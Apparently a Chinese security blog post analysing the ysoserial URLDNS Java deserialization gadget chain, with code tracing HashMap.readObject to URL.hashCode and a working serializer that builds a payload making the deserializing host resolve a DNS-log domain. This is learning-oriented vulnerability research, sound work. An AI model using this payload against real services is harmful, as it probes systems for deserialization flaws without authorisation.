
<!DOCTYPE html>
<html lang="zh-cn">
    
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="generator" content="self_209&#39;blog">
    <title>java反序列化URLDNS - self_209&#39;blog</title>
    <meta name="author" content="self_209">
    
    
    
    <script type="application/ld+json">{"@context":"http://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"self_209","sameAs":["https://github.com/self209","https://twitter.com/","mailto:2662686939@qq.com"]},"articleBody":"初次接触java反序列化漏洞，通过分析ysoserial工具中的payload，复现漏洞，来学习java反序列化漏洞。本文先从最简单的URLDNS Gadget chain开始java反序列化篇章。\n\n\n \n\njava原生反序列化JDK类库中的序列化API\n\njava.io.ObjectOutputStream代表对象输出流，它的writeObject(Object obj)方法可对参数指定的obj对象进行序列化，把得到的字节序列写到一个目标输出流中。\n\njava.io.ObjectInputStream代表对象输入流，它的readObject()方法从一个源输入流中读取字节序列，再把它们反序列化为一个对象，并将其返回。\n\n只有实现了Serializable和Externalizable接口的类的对象才能被序列化。Externalizable接口继承自 Serializable接口，实现Externalizable接口的类完全由自身来控制序列化的行为，而仅实现Serializable接口的类可以 采用默认的序列化方式 。\n\n\n对象序列化包括如下步骤：\n\n创建一个对象输出流，它可以包装一个其他类型的目标输出流，如文件输出流；\n通过对象输出流的writeObject()方法写对象。\n\n对象反序列化的步骤如下：\n\n创建一个对象输入流，它可以包装一个其他类型的源输入流，如文件输入流；\n通过对象输入流的readObject()方法读取对象。\n\n例：\n定义一个Student类，实现Serializable接口\n123456789101112131415161718192021222324252627282930313233343536373839404142import java.io.Serializable;public class Student implements Serializable &#123;    private int age;    private String name;    private String sex;\t    public Student()&#123;    &#125;        public Student(String name,int age,String sex)&#123;        this.age = age;        this.name = name;        this.sex = sex;    &#125;            public int getAge() &#123;        return age;    &#125;    public String getName() &#123;        return name;    &#125;    public String getSex() &#123;        return sex;    &#125;    public void setAge(int age) &#123;        this.age = age;    &#125;    public void setName(String name) &#123;        this.name = name;    &#125;    public void setSex(String sex) &#123;        this.sex = sex;    &#125;&#125;\n\n序列化和反序列化Student类对象\n123456789101112131415161718192021222324252627282930313233343536373839import java.io.File;import java.io.FileInputStream;import java.io.FileNotFoundException;import java.io.FileOutputStream;import java.io.IOException;import java.io.ObjectInputStream;import java.io.ObjectOutputStream;import java.text.MessageFormat;public class SerializeAndDeserialize &#123;    public static void main(String[] args) throws Exception &#123;        SerializeStudent();//序列化Student对象        Student s = DeserializeStudent();//反序列Student对象        System.out.println(MessageFormat.format(&quot;name=&#123;0&#125;,age=&#123;1&#125;,sex=&#123;2&#125;&quot;,                                                 s.getName(), s.getAge(), s.getSex()));    &#125;       private static void SerializeStudent() throws FileNotFoundException,IOException &#123;        Student student = new Student(&quot;zhangsan&quot;,18,&quot;男&quot;);        // ObjectOutputStream 对象输出流，将Student对象存储为Student.txt文件中，完成对Student对象的序列化操作        ObjectOutputStream oo = new ObjectOutputStream(new FileOutputStream(new File(&quot;Student.txt&quot;)));        oo.writeObject(student);        System.out.println(&quot;Student对象序列化成功！&quot;);        oo.close();    &#125;      private static Student DeserializeStudent() throws Exception, IOException &#123;        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(                new File(&quot;Student.txt&quot;)));        Student student = (Student) ois.readObject();        System.out.println(&quot;Student对象反序列化成功！&quot;);        return student;    &#125;&#125;\n\n代码运行结果如下：\n\n反序列化漏洞形成的必要条件漏洞的形成需要找到如下三个条件相关的类，并且都得实现了Serializable接口。\n\n执行类(风险方法类)  sink\n调用链  gadget chain\n入口类  source \n\n1、执行类\n存在风险方法，并且传递参数可控\n比如：\n反射调用参数可控(RCE、SSRF)\nRuntime类的相关方法(RCE)\nURL类的相关方法(SSRF)\n……\n2、调用链\n调用链就是将执行类的风险方法与入口类的readObject方法中调用的方法关联或者说联系在一起的一个或多个类的方法，与执行类的风险方法相连接的链，必须是同类型或者说类型宽泛，方法名相同与否都可以，但是方法内必须调用与执行类的风险方法同名，以此类推直至找到与入口类的readObject方法中调用的方法同名的方法，调用链才算完成。\n这个解释看不懂没关系，后面在如何寻找gadget chain中会作详细解释。\n3、入口类\n入口类首先得重写readObject方法，类型越宽泛越好 。例如：HashMap\n如何寻找gadget chain这里结合流程图对寻找gadget chain作详细解释，以第一个链为例，后面的链都是一个道理。\n\n\n假设这里有一个命令执行风险类A,其中的a方法存在命令执行风险(这里不探究具体代码,只是理解调用链的链接方式)\n\n现在我们要找它的第一个链，现在有三个选择\n\n同类不同名方法调用了a()\n不同类同名方法调用了a()\n不同类不同名方法调用了a()\n当我们选择同类不同名方法调用了a()时，需要考虑的是参数ghi是否可控。\n当我们选择不同类同名方法调用了a()时，需要考虑的是Abc与Ghi是否是同类型，x2可否控制。\n当我们选择不同类不同名方法调用了a()，需要考虑的是Def与Ghi是否是同类型，x1可否控制。\n\n\n\n\n往后的链都是一个道理，直至找到与入口类的readObject方法中，调用的方法同名的方法。\n比如：HashMap.readObject()中调用了hash()，那么我们的链找到hash()方法就可以，当然具体能不能用还是要看参数是否可控。\n\n\nURLDNS Gadget Chain12345ysoserial Gadget Chain:  \tHashMap.readObject()//入口类    \tHashMap.putVal()      \t\tHashMap.hash()        \t\tURL.hashCode() //执行类\n\n从ysoserial工具的payload来看，执行类是URL的hashCode方法，那我们就跟进去URL类去看看。\nURL类\n\n\n123456789   private int hashCode = -1;   public synchronized int hashCode() &#123;       if (hashCode != -1)           return hashCode;       hashCode = handler.hashCode(this);       return hashCode;   &#125;\n\nhashCode默认等于-1，那么就会调用handler.hashCode(this);\n\n跟进到handler.hashCode();\n调用handler.hashCode();传入一个URL对象，会调用getHostAddress方法，根据注释Get the IP address of our host.获取主机ip地址，会向host发送请求。\n123456789101112131415161718192021222324252627/**     * Get the IP address of our host. An empty host field or a DNS failure     * will result in a null return.     *     * @param u a URL object     * @return an &#123;@code InetAddress&#125; representing the host     * IP address.     * @since 1.3     */    protected synchronized InetAddress getHostAddress(URL u) &#123;        if (u.hostAddress != null)            return u.hostAddress;        String host = u.getHost();        if (host == null || host.equals(&quot;&quot;)) &#123;            return null;        &#125; else &#123;            try &#123;                u.hostAddress = InetAddress.getByName(host);            &#125; catch (UnknownHostException ex) &#123;                return null;            &#125; catch (SecurityException se) &#123;                return null;            &#125;        &#125;        return u.hostAddress;    &#125;\n\n好的，现在执行类已经有了，URL.hashCode()。下面开始找调用链，直接搜索hashCode。\n\n嗯。漂亮，1291处这里就不一个一个看了，我们就直接来看payload的Gadget Chain。HashMap.hash()\n\n这里不就是上面所说的，不同类不同名方法调用了hashCode()，我们只需要看是否是同类型，参数是否可控。这里一个类型Object，一个URL，万物皆Object，符合。但是key并不清楚能否控制，接着往下找。\n接下来找那些类调用了hash()，不多，有24处，可以稍微看一下。\n\n直接找到了入口类 HashMap.readObject()，\n\n12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152/** * Reconstitutes this map from a stream (that is, deserializes it). * @param s the stream * @throws ClassNotFoundException if the class of a serialized object *         could not be found * @throws IOException if an I/O error occurs */private void readObject(java.io.ObjectInputStream s)    throws IOException, ClassNotFoundException &#123;    // Read in the threshold (ignored), loadfactor, and any hidden stuff    s.defaultReadObject();    reinitialize();    if (loadFactor &lt;= 0 || Float.isNaN(loadFactor))        throw new InvalidObjectException(&quot;Illegal load factor: &quot; +                                         loadFactor);    s.readInt();                // Read and ignore number of buckets    int mappings = s.readInt(); // Read number of mappings (size)    if (mappings &lt; 0)        throw new InvalidObjectException(&quot;Illegal mappings count: &quot; +                                         mappings);    else if (mappings &gt; 0) &#123; // (if zero, use defaults)        // Size the table using given load factor only if within        // range of 0.25...4.0        float lf = Math.min(Math.max(0.25f, loadFactor), 4.0f);        float fc = (float)mappings / lf + 1.0f;        int cap = ((fc &lt; DEFAULT_INITIAL_CAPACITY) ?                   DEFAULT_INITIAL_CAPACITY :                   (fc &gt;= MAXIMUM_CAPACITY) ?                   MAXIMUM_CAPACITY :                   tableSizeFor((int)fc));        float ft = (float)cap * lf;        threshold = ((cap &lt; MAXIMUM_CAPACITY &amp;&amp; ft &lt; MAXIMUM_CAPACITY) ?                     (int)ft : Integer.MAX_VALUE);        // Check Map.Entry[].class since it&#x27;s the nearest public type to        // what we&#x27;re actually creating.        SharedSecrets.getJavaObjectInputStreamAccess().checkArray(s, Map.Entry[].class, cap);        @SuppressWarnings(&#123;&quot;rawtypes&quot;,&quot;unchecked&quot;&#125;)        Node&lt;K,V&gt;[] tab = (Node&lt;K,V&gt;[])new Node[cap];        table = tab;        // Read the keys and values, and put the mappings in the HashMap        for (int i = 0; i &lt; mappings; i++) &#123;            @SuppressWarnings(&quot;unchecked&quot;)                K key = (K) s.readObject();            @SuppressWarnings(&quot;unchecked&quot;)                V value = (V) s.readObject();            putVal(hash(key), key, value, false, false);//调用hash(key)        &#125;    &#125;&#125;\n\n在最后的for循环中调用了hash()，传递了参数key，而key就是将集合的泛型K反序列化后的对象，HashMap的泛型K,V都是可以控制。那么我们来捋一下Gadget Chain。\n12345678910111213141516Gadget Chain：\tHashMap.readObject()&#123;    \thash(key)\t&#125;    \tHashMap.hash(Object,key)&#123;            key.hashCode()        &#125;    \t\tURL.hashCode()&#123;            \tif (hashCode != -1)            \t\treturn hashCode;        \t\thashCode = handler.hashCode(this);        \t\treturn hashCode;            &#125;\t\t\t\thashCode(URL u) &#123;                    getHostAddress(u);                &#125;\n\nysoserial工具的payload中多走了一步HashMap.putVal()，从Gadget Chain中可以看出我们只需要将HashMap.hash(Object,key)方法中的key传递一个URL对象，就会调用URL.hashCode()，hashCode=-1就会调用handler.hashCode(this)，就顺利调用getHostAddress(u)。\n那么我们便可以构造代码验证一下\n序列化HashMap对象\n1234567891011121314151617import java.io.File;import java.io.FileOutputStream;import java.io.IOException;import java.io.ObjectOutputStream;import java.net.URL;import java.util.HashMap;public class Serialize &#123;    public static void main(String[] args) throws IOException, NoSuchFieldException, IllegalAccessException&#123;        URL url = new URL(&quot;http://7d144017.dns.1433.eu.org&quot;);        HashMap&lt;URL, Integer&gt; hashmap = new HashMap&lt;&gt;();  //HashMap&lt;K, V&gt;,K为URL对象，V随意        hashmap.put(url,1);        ObjectOutputStream oo = new ObjectOutputStream(new FileOutputStream(new File(&quot;HashMap.txt&quot;)));        oo.writeObject(hashmap);    &#125;&#125;\n\n反序列化HashMap对象\n1234567891011import java.io.File;import java.io.FileInputStream;import java.io.IOException;import java.io.ObjectInputStream;public class UnSerialize &#123;    public static void main(String[] args) throws IOException, ClassNotFoundException &#123;        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(new File(&quot;HashMap.txt&quot;)));        ois.readObject();    &#125;&#125;\n\n这时出现了问题，在序列化的时候接收到了请求但是反序列化确没有接收到请求。\n\n经过调试发现，序列化时会发生请求是因为put方法里面也调用了hash()，触发了URL.hashCode，而反序列化时不会发生请求是因为调用到URL.hashCode时，hashCode的值不等于-1，所以进入不到，handler.hashCode(this)，那我们只需要想办法当它序列化时值改为不等于-1的值，调用完put后把他的值改成-1就可以，那要怎么才能改变hashCode的值呢，这里就需要用到Java反射。\n\n改进后的\n1234567891011121314151617181920212223242526import java.io.File;import java.io.FileOutputStream;import java.io.IOException;import java.io.ObjectOutputStream;import java.lang.reflect.Field;import java.net.URL;import java.util.HashMap;public class Serialize &#123;    public static void main(String[] args) throws IOException, NoSuchFieldException, IllegalAccessException &#123;        URL url = new URL(&quot;http://e5e3bb79.dns.1433.eu.org&quot;);        HashMap&lt;URL, Integer&gt; hashmap = new HashMap&lt;&gt;();  //HashMap&lt;K, V&gt;,K为URL对象，V随意        Class c = url.getClass();        Field hashCode = c.getDeclaredField(&quot;hashCode&quot;);        hashCode.setAccessible(true);        hashCode.set(url,-2);//在put前将hashCode的值设置为-2        hashmap.put(url,1);        hashCode.set(url,-1);//之后再设置回-1        ObjectOutputStream oo = new ObjectOutputStream(new FileOutputStream(new File(&quot;HashMap.txt&quot;)));        oo.writeObject(hashmap);    &#125;&#125;\n\n再次尝试，序列化时没有发生请求。\n\n反序列化发送了请求\n\n至此URLDNS分析完毕。\n","dateCreated":"2021-12-26T09:34:26+08:00","dateModified":"2021-12-28T13:05:32+08:00","datePublished":"2021-12-26T09:34:26+08:00","description":"初次接触java反序列化漏洞，通过分析ysoserial工具中的payload，复现漏洞，来学习java反序列化漏洞。本文先从最简单的URLDNS Gadget chain开始java反序列化篇章。","headline":"java反序列化URLDNS","image":[null,"97548.jpg"],"mainEntityOfPage":{"@type":"WebPage","@id":"https://self209.github.io/2021/12/26/20211226/"},"publisher":{"@type":"Organization","name":"self_209","sameAs":["https://github.com/self209","https://twitter.com/","mailto:2662686939@qq.com"]},"url":"https://self209.github.io/2021/12/26/20211226/","keywords":"反序列化, java","thumbnailUrl":"97548.jpg"}</script>
    <meta name="description" content="初次接触java反序列化漏洞，通过分析ysoserial工具中的payload，复现漏洞，来学习java反序列化漏洞。本文先从最简单的URLDNS Gadget chain开始java反序列化篇章。">
<meta property="og:type" content="blog">
<meta property="og:title" content="java反序列化URLDNS">
<meta property="og:url" content="https://self209.github.io/2021/12/26/20211226/index.html">
<meta property="og:site_name" content="self_209&#39;blog">
<meta property="og:description" content="初次接触java反序列化漏洞，通过分析ysoserial工具中的payload，复现漏洞，来学习java反序列化漏洞。本文先从最简单的URLDNS Gadget chain开始java反序列化篇章。">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://self209.github.io/2021/12/26/20211226/image-20211226172414447.png">
<meta property="og:image" content="https://self209.github.io/2021/12/26/20211226/image-20211226231518791.png">
<meta property="og:image" content="https://self209.github.io/2021/12/26/20211226/image-20211226233623759.png">
<meta property="og:image" content="https://self209.github.io/2021/12/26/20211226/image-20211226233741972.png">
<meta property="og:image" content="https://self209.github.io/2021/12/26/20211226/image-20211226234313139.png">
<meta property="og:image" content="https://self209.github.io/2021/12/26/20211226/image-20211226234732673.png">
<meta property="og:image" content="https://self209.github.io/2021/12/26/20211226/image-20211227000438766.png">
<meta property="og:image" content="https://self209.github.io/2021/12/26/20211226/image-20211227000837666.png">
<meta property="og:image" content="https://self209.github.io/2021/12/26/20211226/image-20211227001518142.png">
<meta property="og:image" content="https://self209.github.io/2021/12/26/20211226/image-20211227001635501.png">
<meta property="og:image" content="https://self209.github.io/2021/12/26/20211226/image-20211227175414397.png">
<meta property="og:image" content="https://self209.github.io/2021/12/26/20211226/image-20211227181530286.png">
<meta property="og:image" content="https://self209.github.io/2021/12/26/20211226/image-20211227183531894.png">
<meta property="og:image" content="https://self209.github.io/2021/12/26/20211226/image-20211227185736427.png">
<meta property="article:published_time" content="2021-12-26T01:34:26.000Z">
<meta property="article:modified_time" content="2021-12-28T05:05:32.338Z">
<meta property="article:author" content="self_209">
<meta property="article:tag" content="反序列化">
<meta property="article:tag" content="java">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://self209.github.io/2021/12/26/20211226/image-20211226172414447.png">
    
    
        
    
    
    
    
        <meta property="og:image" content="https://self209.github.io/2021/12/26/20211226/97548.jpg"/>
        <meta class="swiftype" name="image" data-type="enum" content="https://self209.github.io/2021/12/26/20211226/97548.jpg"/>
    
    
    <!--STYLES-->
    
<link rel="stylesheet" href="/assets/css/style-gt5qcce6mgvuqwcgifha2ylts94nspkxjckwcuei5fxp2ypavhmsle0ivz1f.min.css">

    <!--STYLES END-->
    

    

    
        
    
</head>

    <body>
        <div id="blog">
            <!-- Define author's picture -->


    

<header id="header" data-behavior="5">
    <i id="btn-open-sidebar" class="fa fa-lg fa-bars"></i>
    <div class="header-title">
        <a
            class="header-title-link"
            href="/"
            aria-label=""
        >
            self_209&#39;blog
        </a>
    </div>
    
        
            <a
                class="header-right-picture "
                href="#about"
                aria-label="打开链接: /#about"
            >
        
        
        </a>
    
</header>

            <!-- Define author's picture -->


<nav id="sidebar" data-behavior="5">
    <div class="sidebar-container">
        
        
            <ul class="sidebar-buttons">
            
                <li class="sidebar-button">
                    
                        <a
                            class="sidebar-button-link "
                            href="/"
                            
                            rel="noopener"
                            title="首页"
                        >
                        <i class="sidebar-button-icon fa fa-home" aria-hidden="true"></i>
                        <span class="sidebar-button-desc">首页</span>
                    </a>
            </li>
            
                <li class="sidebar-button">
                    
                        <a
                            class="sidebar-button-link "
                            href="/all-categories"
                            
                            rel="noopener"
                            title="分类"
                        >
                        <i class="sidebar-button-icon fa fa-bookmark" aria-hidden="true"></i>
                        <span class="sidebar-button-desc">分类</span>
                    </a>
            </li>
            
                <li class="sidebar-button">
                    
                        <a
                            class="sidebar-button-link "
                            href="/all-tags"
                            
                            rel="noopener"
                            title="标签"
                        >
                        <i class="sidebar-button-icon fa fa-tags" aria-hidden="true"></i>
                        <span class="sidebar-button-desc">标签</span>
                    </a>
            </li>
            
                <li class="sidebar-button">
                    
                        <a
                            class="sidebar-button-link "
                            href="/all-archives"
                            
                            rel="noopener"
                            title="归档"
                        >
                        <i class="sidebar-button-icon fa fa-archive" aria-hidden="true"></i>
                        <span class="sidebar-button-desc">归档</span>
                    </a>
            </li>
            
                <li class="sidebar-button">
                    
                        <a
                            class="sidebar-button-link "
                            href="#about"
                            
                            rel="noopener"
                            title="关于"
                        >
                        <i class="sidebar-button-icon fa fa-question" aria-hidden="true"></i>
                        <span class="sidebar-button-desc">关于</span>
                    </a>
            </li>
            
        </ul>
        
            <ul class="sidebar-buttons">
            
                <li class="sidebar-button">
                    
                        <a
                            class="sidebar-button-link "
                            href="https://github.com/self209"
                            
                                target="_blank"
                            
                            rel="noopener"
                            title="GitHub"
                        >
                        <i class="sidebar-button-icon fab fa-github" aria-hidden="true"></i>
                        <span class="sidebar-button-desc">GitHub</span>
                    </a>
            </li>
            
                <li class="sidebar-button">
                    
                        <a
                            class="sidebar-button-link "
                            href="https://twitter.com/"
                            
                                target="_blank"
                            
                            rel="noopener"
                            title="Twitter"
                        >
                        <i class="sidebar-button-icon fab fa-twitter" aria-hidden="true"></i>
                        <span class="sidebar-button-desc">Twitter</span>
                    </a>
            </li>
            
                <li class="sidebar-button">
                    
                        <a
                            class="sidebar-button-link "
                            href="mailto:2662686939@qq.com"
                            
                                target="_blank"
                            
                            rel="noopener"
                            title="邮箱"
                        >
                        <i class="sidebar-button-icon fa fa-envelope" aria-hidden="true"></i>
                        <span class="sidebar-button-desc">邮箱</span>
                    </a>
            </li>
            
        </ul>
        
    </div>
</nav>

            
        <div class="post-header-cover
                    text-center
                    "
             style="background-image:url('/2021/12/26/20211226/97548.jpg');"
             data-behavior="5">
            
                <div class="post-header main-content-wrap text-center">
    
        <h1 class="post-title">
            java反序列化URLDNS
        </h1>
    
    
        <div class="post-meta">
    <time datetime="2021-12-26T09:34:26+08:00">
	
		    12月 26, 2021
    	
    </time>
    
</div>

    
</div>

            
        </div>

            <div id="main" data-behavior="5"
                 class="hasCover
                        hasCoverMetaIn
                        ">
                
<article class="post">
    
    
    <div class="post-content markdown">
        <div class="main-content-wrap">
            <p>初次接触java反序列化漏洞，通过分析<a target="_blank" rel="noopener" href="https://github.com/frohoff/ysoserial">ysoserial</a>工具中的payload，复现漏洞，来学习java反序列化漏洞。本文先从最简单的URLDNS Gadget chain开始java反序列化篇章。</p>
<span id="more"></span>

 <h1 id="table-of-contents">目录</h1><ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#java%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-text">java原生反序列化</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%BD%A2%E6%88%90%E7%9A%84%E5%BF%85%E8%A6%81%E6%9D%A1%E4%BB%B6"><span class="toc-text">反序列化漏洞形成的必要条件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A6%82%E4%BD%95%E5%AF%BB%E6%89%BEgadget-chain"><span class="toc-text">如何寻找gadget chain</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#URLDNS-Gadget-Chain"><span class="toc-text">URLDNS Gadget Chain</span></a></li></ol>

<h3 id="java原生反序列化"><a href="#java原生反序列化" class="headerlink" title="java原生反序列化"></a>java原生反序列化</h3><p><strong>JDK类库中的序列化API</strong></p>
<ul>
<li><p>java.io.ObjectOutputStream代表对象输出流，它的writeObject(Object obj)方法可对参数指定的obj对象进行序列化，把得到的字节序列写到一个目标输出流中。</p>
</li>
<li><p>java.io.ObjectInputStream代表对象输入流，它的readObject()方法从一个源输入流中读取字节序列，再把它们反序列化为一个对象，并将其返回。</p>
</li>
<li><p>只有实现了Serializable和Externalizable接口的类的对象才能被序列化。Externalizable接口继承自 Serializable接口，实现Externalizable接口的类完全由自身来控制序列化的行为，而仅实现Serializable接口的类可以 采用默认的序列化方式 。</p>
</li>
</ul>
<p><strong>对象序列化包括如下步骤：</strong></p>
<ol>
<li>创建一个对象输出流，它可以包装一个其他类型的目标输出流，如文件输出流；</li>
<li>通过对象输出流的writeObject()方法写对象。</li>
</ol>
<p><strong>对象反序列化的步骤如下：</strong></p>
<ol>
<li>创建一个对象输入流，它可以包装一个其他类型的源输入流，如文件输入流；</li>
<li>通过对象输入流的readObject()方法读取对象。</li>
</ol>
<p><em><strong>例：</strong></em></p>
<p><strong>定义一个Student类，实现Serializable接口</strong></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Student</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> age;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> String sex;</span><br><span class="line">	</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Student</span><span class="params">()</span></span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Student</span><span class="params">(String name,<span class="keyword">int</span> age,String sex)</span></span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.age = age;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">        <span class="keyword">this</span>.sex = sex;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getAge</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getSex</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> sex;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setAge</span><span class="params">(<span class="keyword">int</span> age)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setName</span><span class="params">(String name)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setSex</span><span class="params">(String sex)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.sex = sex;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>序列化和反序列化Student类对象</strong></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileNotFoundException;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.text.MessageFormat;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">SerializeAndDeserialize</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        SerializeStudent();<span class="comment">//序列化Student对象</span></span><br><span class="line">        Student s = DeserializeStudent();<span class="comment">//反序列Student对象</span></span><br><span class="line">        System.out.println(MessageFormat.format(<span class="string">&quot;name=&#123;0&#125;,age=&#123;1&#125;,sex=&#123;2&#125;&quot;</span>,</span><br><span class="line">                                                 s.getName(), s.getAge(), s.getSex()));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">   </span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">SerializeStudent</span><span class="params">()</span> <span class="keyword">throws</span> FileNotFoundException,IOException </span>&#123;</span><br><span class="line">        Student student = <span class="keyword">new</span> Student(<span class="string">&quot;zhangsan&quot;</span>,<span class="number">18</span>,<span class="string">&quot;男&quot;</span>);</span><br><span class="line">        <span class="comment">// ObjectOutputStream 对象输出流，将Student对象存储为Student.txt文件中，完成对Student对象的序列化操作</span></span><br><span class="line">        ObjectOutputStream oo = <span class="keyword">new</span> ObjectOutputStream(<span class="keyword">new</span> FileOutputStream(<span class="keyword">new</span> File(<span class="string">&quot;Student.txt&quot;</span>)));</span><br><span class="line">        oo.writeObject(student);</span><br><span class="line">        System.out.println(<span class="string">&quot;Student对象序列化成功！&quot;</span>);</span><br><span class="line">        oo.close();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> Student <span class="title">DeserializeStudent</span><span class="params">()</span> <span class="keyword">throws</span> Exception, IOException </span>&#123;</span><br><span class="line">        ObjectInputStream ois = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> FileInputStream(</span><br><span class="line">                <span class="keyword">new</span> File(<span class="string">&quot;Student.txt&quot;</span>)));</span><br><span class="line">        Student student = (Student) ois.readObject();</span><br><span class="line">        System.out.println(<span class="string">&quot;Student对象反序列化成功！&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> student;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>代码运行结果如下：</p>
<p><img src="image-20211226172414447.png" alt="image-20211226172414447"></p>
<h3 id="反序列化漏洞形成的必要条件"><a href="#反序列化漏洞形成的必要条件" class="headerlink" title="反序列化漏洞形成的必要条件"></a>反序列化漏洞形成的必要条件</h3><p>漏洞的形成需要找到如下三个条件相关的类，并且都得实现了Serializable接口。</p>
<ol>
<li>执行类(风险方法类)  sink</li>
<li>调用链  gadget chain</li>
<li>入口类  source </li>
</ol>
<p>1、<strong>执行类</strong></p>
<p>存在风险方法，并且传递参数可控</p>
<p>比如：</p>
<p>反射调用参数可控(RCE、SSRF)</p>
<p>Runtime类的相关方法(RCE)</p>
<p>URL类的相关方法(SSRF)</p>
<p>……</p>
<p>2、<strong>调用链</strong></p>
